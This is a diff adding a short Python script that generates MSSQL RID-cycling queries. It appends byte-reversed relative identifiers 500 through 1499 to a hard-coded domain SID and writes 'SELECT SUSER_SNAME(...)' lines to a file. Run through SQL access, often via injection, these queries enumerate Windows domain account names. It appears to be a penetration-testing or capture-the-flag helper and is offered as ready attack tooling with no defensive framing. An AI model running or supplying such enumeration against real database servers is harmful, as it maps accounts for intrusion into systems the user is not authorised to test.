@@ -1,0 +1,16 @@
+#!/usr/bin/python3
+
+
+def generate_rid_queries(base_sid, start_rid, count, output_file):
+    with open(output_file, "w") as file:
+        for rid in range(start_rid, start_rid + count):
+            hex_rid = f"{rid:08X}" 
+            reversed_rid = ''.join(
+                [hex_rid[i:i+2] for i in range(0, len(hex_rid), 2)][::-1]
+            )
+            full_sid = f"{base_sid}{reversed_rid}"
+            query = f"SELECT SUSER_SNAME({full_sid})"
+            file.write(query + "\n")
+
+if __name__ == "__main__":
+    generate_rid_queries("0x010500000000000515000000A185DEEFB22433798D8E847A", 500, 1000, "queries.txt")
